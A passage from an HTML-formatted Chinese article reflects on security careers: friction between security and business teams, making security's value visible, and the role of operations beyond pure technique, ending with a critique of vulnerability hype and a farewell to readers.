的抽屉进去，也同样可以拿到有锁抽屉内的东西。
</p>


<figure id="org283ad6c">
<img src="./images/Cgp9HWAvYBCAJ6GuAAETUz49aKk271.png" alt="Cgp9HWAvYBCAJ6GuAAETUz49aKk271.png" width="80%">

</figure>

<p>
锁抽屉
</p>
</div>
</div>
<div id="outline-container-安全与业务" class="outline-3">
<h3 id="安全与业务">安全与业务</h3>
<div class="outline-text-3" id="text-安全与业务">
<p>
多年前，曾有阿里员工在匿名社区上吐槽阿里安全部是“阉党”，称其总拿安全
说事，阻碍业务发展。
</p>


<figure id="orge7507a3">
<img src="./images/CioPOWAvX9uAT8PGAAOrTxCG9Ak833.png" alt="CioPOWAvX9uAT8PGAAOrTxCG9Ak833.png" width="80%">

</figure>

<p>
阿里内部员工对安全部的吐槽
</p>

<p>
这种安全与业务的冲突在企业内部经常上演着，个人认为有以下几方面原因。
</p>

<ul class="org-ul">
<li><b>安全知识匮乏</b> ：很多业务不懂安全，也就无法理解安全问题所带来的危害，
自然就不愿意配合。以前就曾遇到过业务不配合去修复漏洞，然后服务器被入
侵了，导致业务方在公司内被通报批评，此事之后的安全事件处理，大家也就
都变成非常积极。</li>

<li><b>优先级认知不对等</b> ：多数情况下，安全人员认为安全高于一切，业务人员
认为产品体验、性能等业务功能高于安全。另外，安全工作很多不属于业务同
学的KPI，修复漏洞或者安全加固等工作对他的绩效帮助不大，大多是“附加
工作”，优先级没有业务开发工作高，也就不太愿意配合安全工作。</li>

<li><b>安全价值可见度低</b> ：安全人员做了很多工作，但也无法保证绝对的安全性，
有时可能还是会被入侵，这时候由于业务未看到安全价值，导致会有抱怨。这
正如大雨下的雨伞，已经帮你挡住了大部分的雨水，而你却只看到了零星洒落
到你身上的雨滴。</li>
</ul>

<p>
针对以上这些问题，=企业= 应该经常 <code>对业务同事进行安全培训，提升安全意
识和技能</code> ，尽早地让安全成为业务的一部分。让大家意识到安全工作是大家协
同完成的，而不应该全由安全人员来背锅。
</p>

<p>
而 <code>安全人员也应该尽可能地让安全价值可视化，多宣传下安全系统的价值</code> 。
比如通过WAF年底总结报告，让大家了解安全部帮助公司拦截了多少次攻击，以
及进行全局实时攻击态势展示，统计漏洞扫描系统全年发现多少个漏洞等等。
</p>

<p>
<b>其实安全与业务的冲突问题，本质上就是互相理解与信任的问题。</b>
</p>

<p>
因为安全与业务的冲突本就是长期存在的，难以避免，这时就应该互相站在对方
的立场思考问题。比如，有些低危漏洞的修复与架构整改成本过高，甚至影响了
用户体验和性能，这里就可以考虑其他安全妥协方案，来兼顾、倾向业务的发展。
</p>
</div>
</div>
<div id="outline-container-技术与运营" class="outline-3">
<h3 id="技术与运营">技术与运营</h3>
<div class="outline-text-3" id="text-技术与运营">
<p>
一切有利于提升产品安全能力与影响力的方法都可称为安全运营。例如，接收外
部反馈去优化产品体验、通过复盘漏报的漏洞去优化检测规则、宣传产品能力和
价值等等。
</p>

<ul class="org-ul">
<li>有些纯技术人员，一心沉迷于技术本身，使用了很多非常厉害的技术，系统检
测能力也很强，但由于没有业务使用，最后还是黄了，这就是运营不善导致的；</li>

<li>很多安全系统开发完成后，剩下的难点不在于系统开发本身，而是在于规则的
不断优化，这就需要你长期进行积累；</li>

<li>刚刚我提到安全价值的可见度低，所以这就更需要通过运营手段去展示和宣传
了，让业务人员看到安全的价值。</li>
</ul>

<p>
所以，你可以看出很多时候安全运营不是技术问题，而是运营问题。
</p>

<p>
<b>可以这么说：技术是基石，运营是必要的，但炒作是可耻的。</b>
</p>

<p>
一些公关炒作也可以看作是运营的部分，因为团队或产品需要对外发声，以提高
影响力。个人并不排斥，只是反感一些违反道德的不实炒作。
</p>

<blockquote>
<p>
比如，有些安全公司发现漏洞后，给漏洞命名，然后通过购买多方的媒体宣传渠
道，故意炒作，夸大漏洞危害，企图提升公司知名度，这种恶意炒作行为就应该
受到抵制。
</p>
</blockquote>

<p>
综上可见， <code>安全行业并不只是一个技术工作</code> 。它还需要你具备君子般的武德、
持之以恒向优秀进发的毅力，以及能够顾全整体的广阔视野。最重要的是，你还
需要是个懂业务、擅运营的安全人员，能在技术之外，与其他伙伴协调、配合，
为团队贡献更多力量。
</p>

<p>
以上便是我结合自己多年来在安全行业的所见所闻，总结了一些安全观点，供君
参考，也欢迎你在留言区分享更多你的安全观点。
</p>

<p>
青山不改，绿水长流，祝各位工作顺利，在事业做出更牛的成绩！
</p>

<p>
再见！
</p>
</div>
</div>
</section>
</div>
</body>
</html>
